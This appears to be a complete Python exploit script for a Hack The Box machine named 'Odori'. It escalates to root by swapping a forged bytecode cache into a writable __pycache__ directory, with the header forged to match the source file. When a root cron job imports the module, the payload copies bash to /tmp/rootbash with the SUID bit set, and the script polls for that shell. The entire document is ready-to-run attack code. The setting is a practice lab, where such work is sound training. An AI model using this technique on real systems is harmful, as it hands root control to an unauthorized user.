#!/usr/bin/env python3
"""HTB Odori: local privilege escalation through helper.py bytecode cache poisoning."""
import importlib.util
import marshal
import os
from pathlib import Path
import shutil
import stat
import struct
import sys
import tempfile
import time

SOURCE = Path('/opt/archiver/helper.py')
CACHE = Path('/opt/archiver/__pycache__/helper.cpython-310.pyc')
ROOTBASH = Path('/tmp/rootbash')


def main():
    print('[*] HTB Odori - preflight checks')
    if os.geteuid() == 0:
        print('[!] Already running as root; no exploitation needed.')
        return 0
    if sys.version_info[:2] != (3, 10):
        print(f'[!] Python 3.10 is required on the target; current version: {sys.version.split()[0]}')
        return 1
    if not SOURCE.is_file() or not CACHE.parent.is_dir():
        print('[!] Expected files were not found. Run this script on the Odori target.')
        return 1
    if not os.access(CACHE.parent, os.W_OK | os.X_OK):
        print(f'[!] No write permissions on {CACHE.parent}')
        return 1
    source_text = SOURCE.read_text()
    if 'tar_and_move_files' not in source_text:
        print('[!] The expected function is missing from helper.py; no changes were made.')
        return 1
    if ROOTBASH.exists() and ROOTBASH.stat().st_uid == 0 and ROOTBASH.stat().st_mode & stat.S_ISUID:
        print('[+] /tmp/rootbash already exists with root SUID permissions.')
        print('[+] Run: /tmp/rootbash -p')
        return 0

    s = SOURCE.stat()
    # The payload runs when the module is imported, not when a function is called.
    malicious_source = '''import os
import shutil
import subprocess
from datetime import datetime

try:
    shutil.copy2('/bin/bash', '/tmp/rootbash')
    os.chmod('/tmp/rootbash', 0o4755)
except Exception:
    pass

def tar_and_move_files(file_path, archive_dir):
    current_date = datetime.now().strftime('%Y-%m-%d')
    tar_filename = os.path.join(archive_dir, f'{current_date}_{os.path.basename(file_path)}.tar.gz')
    subprocess.Popen(['/usr/bin/tar', '-czf', tar_filename, '-C', os.path.dirname(file_path), os.path.basename(file_path)])
    os.remove(file_path)
'''
    code = compile(malicious_source, str(SOURCE), 'exec')
    # PEP 552 header with timestamp-based invalidation.
    header = importlib.util.MAGIC_NUMBER + struct.pack('<III', 0, int(s.st_mtime) & 0xffffffff, s.st_size & 0xffffffff)
    blob = header + marshal.dumps(code)
    with tempfile.NamedTemporaryFile(prefix='.odori-', suffix='.pyc', dir=CACHE.parent, delete=False) as tmp:
        newpath = Path(tmp.name)
        tmp.write(blob)
    try:
        # Back up the original cache for inspection, if readable.
        if CACHE.is_file() and os.access(CACHE, os.R_OK):
            backup = Path('/tmp/odori-helper-original.pyc')
            shutil.copyfile(CACHE, backup)
            print(f'[+] Original cache backed up to: {backup}')
        os.chmod(newpath, 0o644)
        os.replace(newpath, CACHE)
    finally:
        if newpath.exists():
            newpath.unlink()

    print(f'[+] Cache replaced: {CACHE}')
    print('[*] Waiting for the root cron job to import helper.py...')
    for _ in range(24):
        if ROOTBASH.exists():
            st = ROOTBASH.stat()
            if st.st_uid == 0 and st.st_mode & stat.S_ISUID:
                print('[+] Root SUID binary detected! Run: /tmp/rootbash -p')
                return 0
        time.sleep(5)
    print('[!] No result after 120 seconds. Check cron, permissions, and the helper.py timestamp.')
    return 1


if __name__ == '__main__':
    try:
        raise SystemExit(main())
    except (OSError, ValueError) as exc:
        print(f'[!] Error: {exc}')
        raise SystemExit(1)
